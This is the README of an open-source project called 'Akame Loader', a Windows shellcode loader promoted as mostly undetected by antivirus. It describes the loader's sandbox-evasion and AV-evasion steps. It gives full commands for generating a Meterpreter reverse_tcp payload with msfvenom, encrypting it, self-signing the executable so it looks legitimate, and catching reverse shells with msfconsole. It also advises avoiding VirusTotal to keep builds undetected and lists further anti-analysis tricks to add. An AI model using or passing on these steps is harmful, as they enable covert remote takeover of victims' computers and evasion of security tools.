<h1 align="center">Akame Loader</h1>
<p align="center">
  <img width="250" height="250" src="https://raw.githubusercontent.com/Wtf-Is-This-x1337/Akame-Loader/main/Images/akame.png" width="250" height="250">
</p>
<h4 align="center">An open source, UD (3/71) shellcode loader written in C++17</h4>

## Details
Icon: https://icon-icons.com/icon/Halloween-eye/109170
| Name | Details |
| ------ | ------ |
| Name | Akame Loader |
| Author | WtfIsThis |
| Language | C++17 |
| Platform | Windows |
| Version | 1.0 |
| License | MIT |
| Libraries | kernel32, advapi32, crypt32 |
| Encryption | AES256 |
| Build | Release - x64 |

! If you change the encryption method and want to keep your executable UD for a longer period of time, don't use VirusTotal / AntiScan.me / any other site that distributes to security vendors.

## How does it work?
1. Uses WINAPI WinMain so it doesn't popup any console window
2. Checks the current hard disk, if the size is under 100GB it closes itself
3. Sleeps for 10000ms (10s)
4. Checks if any tickcount-related function was manipulated by a sandbox (by checking the hashes and comparing the time slept with the time elapsed on the machine), if something seems wrong, it closes itself
5. Stores the IV, the encryption Key, and the encrypted payload as vectors
6. Allocates a memory buffer for the payload
7. Decrypts the payload (aes256) and closes itself if something doesn't work correctly
8. Copies the payload to a new buffer
9. Makes the new buffer as executable (This is not done during the first allocation because it's suspicious that a memory space is ReadWriteExecute at the same time and AVs may flag it!)
10. Executes the payload with an infinite thread (when the shellcode sends an 'exit' command, the process will close)

## How to build?
**1. Generate a shellcode with metasploit<br>**
- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=*IP* LPORT=*PORT* -f raw > shellcode.bin

**2. Encrypt your shellcode with encrypt.exe<br>**
- mv shellcode.bin \Akame Loader\x64\Release\Resources\ <br>
- cd \Akame Loader\x64\Release\Resources\ <br>
- (optional) encrypt --help<br>
- encrypt.exe -l cpp -m shellcode.bin -e random -o cli<br>

**3. Copy the output and paste it under the "payload" comment<br>**
- Paste your IV key, your KEY and your BUFF into the existent vectors<br>

**4. Change the resources<br>**
- Add your icon, your company name, etc.

**5. Build the project<br>**
- Platform Toolset: Visual Studio 2022 (v143)<br>
- Language standard: ISO C++17<br>
- Optimization: /O2 <br>
- Configuration: Release<br>
- Platform: x64<br>
- Runtime Library: Multi-Threaded (/MT)<br>
- SubSystem: Windows<br>
- Dependencies: user32.lib;advapi32.lib;crypt32.lib;<br>
- Generate debug info: No
  
**6. Add a certificate to your executable<br>**
  ! Change "Akame.exe" to your executable and AkameCert/AkameCA to whatever you want<br>
- move Akame.exe Resources && cd Resources<br>
- makecert.exe -r -pe -n "CN=Akame CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AkameCA.pvk AkameCA.cer<br>
- certutil -user -addstore Root AkameCA.cer<br>
- makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer<br>
- pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx<br>
- signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe
  
**7. Listen for incomming connections<br>**
- msfconsole -q
- use exploit/multi/handler
- set payload windows/x64/meterpreter/reverse_tcp
- (optional) show options
- set LHOST *IP*
- set LPORT *PORT*
- exploit

## Video POC
Platform: Windows 10 x64 <br>
Antivirus: Windows Defender <br>
Link: https://streamable.com/mwknij (24/10/2022) <br>
! Blackscreens in the video caused by UAC 
  
## VirusTotal Scan (3/71 security vendors and no sandboxes on 24/10/2022)
I uploaded the loader to Virus Total because I don't want this to be used for malicious purposes!<br>
The shellcode used was generated with metasploit (payload: windows/x64/meterpreter/reverse_tcp) and encrypted by \resources\encrypt.exe.<br>
The loader was build with VS22 and signed with a sha1 certificate

![Virus Total](https://raw.githubusercontent.com/Wtf-Is-This-x1337/Akame-Loader/main/Images/virustotal.png)

Link: https://www.virustotal.com/gui/file/68e6a25457093584a043ed3f721be9bc9b6456edd792cb4e30054e85bdc4119f?nocache=1

## What should be added to make it more advanced / functional?
- More anti analysis techniques (checking for suspicious files, directories, processes and windows' names) <br>
- Anti debugging (detecting analysis in general) <br>
- Anti static analysis (function call obfuscation and also finding kernel32 location in the process environment block to avoid using GetModuleHandle() and GetProcAddress())<br>
- Adding 'fake' imports to fill the import table and make it look more legitimate

## Properties
**File**
- Name: Akame.exe <br>
- Architecture: x64 <br>
- File size: 170336 bytes <br>

**Hashes**
- MD5: 560e4432cdbf26332fd3795cf3647cb7 <br>
- SHA1: ffd9942abb6dff4467456b06af2e2742427aff46 <br>
- SHA256: 68e6a25457093584a043ed3f721be9bc9b6456edd792cb4e30054e85bdc4119f

**Table of Imports**
<details>
  <summary>- ADVAPI32.dll: 9 functions</summary>
CryptAcquireContextW, 194<br>
CryptCreateHash, 196<br>
CryptDecrypt, 197<br>
CryptDeriveKey, 198<br>
CryptDestroyHash, 199<br>
CryptDestroyKey, 200<br>
CryptHashData, 217<br>
CryptReleaseContext, 220<br>
CryptSetKeyParam, 222
</details>
<details>
  <summary>- KERNEL32.dll: 72 functions</summary>
CloseHandle, 137<br>
CreateFileW, 206<br>
CreateThread, 245<br>
DeleteCriticalSection, 276<br>
DeviceIoControl, 292<br>
EnterCriticalSection, 312<br>
ExitProcess, 359<br>
FindClose, 382<br>
FindFirstFileExW, 388<br>
FindNextFileW, 405<br>
FlushFileBuffers, 424<br>
FreeEnvironmentStringsW, 435<br>
FreeLibrary, 436<br>
GetACP, 443<br>
GetCommandLineA, 479<br>
GetCommandLineW, 480<br>
GetConsoleMode, 517<br>
GetConsoleOutputCP, 521<br>
GetCPInfo, 458<br>
GetCurrentProcess, 544<br>
GetCurrentProcessId, 545<br>
GetCurrentThreadId, 549<br>
GetEnvironmentStringsW, 577<br>
GetFileType, 600<br>
GetLastError, 618<br>
GetModuleFileNameW, 637<br>
GetModuleHandleExW, 640<br>
GetModuleHandleW, 641<br>
GetOEMCP, 673<br>
GetProcAddress, 696<br>
GetProcessHeap, 702<br>
GetStartupInfoW, 730<br>
GetStdHandle, 732<br>
GetStringTypeW, 737<br>
GetSystemTimeAsFileTime, 755<br>
GetTickCount64, 786<br>
HeapAlloc, 849<br>
HeapFree, 853<br>
HeapReAlloc, 856<br>
HeapSize, 858<br>
InitializeCriticalSectionAndSpinCount, 875<br>
InitializeSListHead, 879<br>
IsDebuggerPresent, 901<br>
IsProcessorFeaturePresent, 908<br>
IsValidCodePage, 914<br>
LCMapStringW, 952<br>
LeaveCriticalSection, 964<br>
LoadLibraryExW, 970<br>
MultiByteToWideChar, 1014<br>
QueryPerformanceCounter, 1106<br>
RaiseException, 1128<br>
RtlCaptureContext, 1237<br>
RtlLookupFunctionEntry, 1244<br>
RtlUnwindEx, 1250<br>
RtlVirtualUnwind, 1251<br>
SetFilePointerEx, 1331<br>
SetLastError, 1345<br>
SetStdHandle, 1371<br>
SetUnhandledExceptionFilter, 1407<br>
Sleep, 1423<br>
TerminateProcess, 1438<br>
TlsAlloc, 1456<br>
TlsFree, 1457<br>
TlsGetValue, 1458<br>
TlsSetValue, 1459<br>
UnhandledExceptionFilter, 1472<br>
VirtualAlloc, 1497<br>
VirtualProtect, 1503<br>
WaitForSingleObject, 1514<br>
WideCharToMultiByte, 1553<br>
WriteConsoleW, 1572<br>
WriteFile, 1573
</details>

## License
MIT License

Copyright (c) 2022 WtfIsThis

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

## Disclaimer
This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
